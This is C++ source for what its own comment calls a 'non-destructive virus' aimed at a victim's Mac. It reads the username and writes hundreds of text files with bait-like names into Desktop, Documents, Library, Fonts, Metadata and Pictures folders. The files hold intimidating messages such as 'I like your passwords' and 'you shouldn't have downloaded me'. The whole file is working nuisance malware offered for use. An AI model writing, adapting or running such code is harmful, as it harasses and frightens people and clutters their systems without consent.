#include <iostream>
#include <string>
#include <fstream>
#include <cstdio>
#include <ctime>
#include <stdlib.h> 

//this code is for a non-destructive "virus" which can spam text files in different 
//locations on the victim's computer, which have randomized names and messages

using namespace std;

int main(){

srand((unsigned) time(0));


	char text[255];	//finds username first
	   FILE *name;
	   name = popen("whoami", "r");
	   fgets(text, sizeof(text), name);

std::string pathvar = text; 
pathvar.erase(std::remove(pathvar.begin(), pathvar.end(), '\n'), 
     pathvar.end());		//fget records the \n operator, which messes up the path 
	
	  
int x=100;  //change number for more (or less) files created 

	while(x>0){ 
	
	int random=rand() % 9 + 2; 
	std::string filename; 
	switch(random) {

		case 2 : 
			filename = "hi"; 
			break; 
		case 3 :
			filename = "hello, " + pathvar; 
			break;
		case 4 :
			filename = "haha";
			break;
		case 5 :
			filename = "greetings";
			break;
		case 6 : 
			filename = "love me"; 
			break;
		case 7 :
			filename = "look inside!";
			break;
		case 8 :
			filename = "read me"; 
			break;
		case 9 :
			filename = "don't ignore me!";
			break; 
		case 10 :
			filename = pathvar + ", look"; 
			break; 
		default :
			filename = "thank you"; 

	}
	int random2=rand() % 9 +1; 
	std::string message; 
	switch(random2){

		case 1 :
			message = "I want to see you"; 
			break; 
		case 2 :
			message = "smile for me";
			break;
		case 3 :
			message = "now let me in";
			break; 
		case 4 :
			message = "I won't hurt you";
			break; 
		case 5 :
			message = "can you hear me?"; 
			break; 
		case 6 :
			message = "do you like my messages?"; 
			break; 
		case 7 :
			message = "do you love me?";
			break; 
		case 8 :
			message = "you shouldn't have downloaded me"; 
			break;
		case 9 :
			message = "I like your passwords, " + pathvar;
			break; 
		default : 
			message = "I love you!";
	
	}

	std::string value = to_string(x); 
	std::string path1 = "/Users/";  //strings are "added" to assemble them 
	
	std::string pathd = "/Desktop/" + filename;
	std::string pathdoc = "/Documents/" + filename; 
	std::string pathlib = "/Library/" + filename; 
	std::string pathvalue= value + ".txt"; 
	
	std::string deskpath= path1 + pathvar + pathd + pathvalue;  //paths created
	std::string docupath= path1 + pathvar + pathdoc + pathvalue; 
	std::string libpath= path1 + pathvar + pathlib + pathvalue; 
	std::string appsupp= path1 + pathvar + "/Library/Application support/" + filename + pathvalue; 
	std::string fontpath = path1 + pathvar + "/Library/Fonts/" + filename + pathvalue; 
	std::string metapath = path1 + pathvar + "/Library/Metadata/" + filename + pathvalue; 
	std::string picpath = path1 + pathvar + "/Pictures/" + filename + pathvalue;

	//std::cout << fullpath << "\n"; -for testing paths

	std::ofstream outfile (deskpath); //creates final files
	outfile << message << "\n";
	outfile.close();

	std::ofstream outfilea (docupath);
	outfilea << message << "\n"; 
	outfilea.close(); 

	std::ofstream outfileb (libpath); 
	outfileb << message << "\n"; 
	outfileb.close(); 

	std::ofstream outfilec (appsupp);
	outfilec << message << "\n";
	outfilec.close();

	std::ofstream outfiled (fontpath);
	outfiled << message << "\n";
	outfiled.close();

	std::ofstream outfilee (metapath);
	outfilee << message << "\n";
	outfilee.close();

	std::ofstream outfilef (picpath);
	outfilef << message << "\n";
	outfilef.close();
	x--; 
}

}